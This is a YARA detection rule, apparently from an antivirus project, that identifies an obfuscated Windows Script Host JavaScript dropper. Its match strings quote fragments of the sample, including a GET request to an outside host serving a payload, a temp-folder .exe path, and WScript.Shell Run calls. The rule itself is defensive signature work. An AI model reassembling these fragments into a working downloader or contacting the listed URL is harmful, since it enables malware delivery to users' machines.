rule sig_20160328_e25b3c3a967cc97e2b0e224faeb9f02b {
  meta:
    description = "datamaliciousorder - file 20160328_e25b3c3a967cc97e2b0e224faeb9f02b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0be0e8ac9c7b5b8f3bf32bcb9cab7ebfc91511c19e225682c262b4aa9da2c4cb"

  strings:
    $s1  = "function Lvlqxwti() {return Jvskx[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"BLvMfUHD.exe\";};" fullword ascii
    $s2  = "function Yaniz(Gquimuffxw, Jtqfgrivc){return Gquimuffxw - Jtqfgrivc;};" fullword ascii
    $s3  = "var Jvskx = function Docnfzk() {return WScript[Nysanvkq](\"WScript.Shell\");}();" fullword ascii
    $s4  = "do {WScript[Dluidupzh](Ffklseatq() * 11)} while (Bsqcauxgnk[\"readystate\"] < 2 * 2);" fullword ascii
    $s5  = "Bsqcauxgnk[Cepntas](\"GET\", \"http://perfect-nutrition.co.uk/lwqo9oa\", false);" fullword ascii
    $s6  = "function Gwpibdlg(Osrmwu){Jvskx[\"Run\"](Osrmwu, Tnyly, Tnyly);};" fullword ascii
    $s7  = "function Oevrc() {return ((Hdwwevngfk == true) && (Hdwwevngfk == Gsecmidw)) ? 1 : Tnyly;};" fullword ascii
    $s8  = "function Cuutqwvw(Lbobjrydz) {var Zothczvup = (1, 2, 3, 4, 5, Lbobjrydz); return Zothczvup;};" fullword ascii
    $s9  = "var Gsecmidw = false;" fullword ascii
    $s10 = "function Astrxqmdqw()" fullword ascii
    $s11 = "return Yaniz(Xuqnuzcbb, Rfrofg);" fullword ascii
    $s12 = "Gsecmidw = true; " fullword ascii
    $s13 = "var Hdwwevngfk = false;" fullword ascii
    $s14 = "function Uijkrmz(){return Abcrjf;};" fullword ascii
    $s15 = " while (Drebr){" fullword ascii
    $s16 = "function Phtuyl(){return Nysanvkq;};" fullword ascii
    $s17 = "Hdwwevngfk = true; " fullword ascii
    $s18 = "var Pypwttk = false;" fullword ascii
    $s19 = "function Ffklseatq(){return 22;};" fullword ascii
    $s20 = "var Awvhve = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}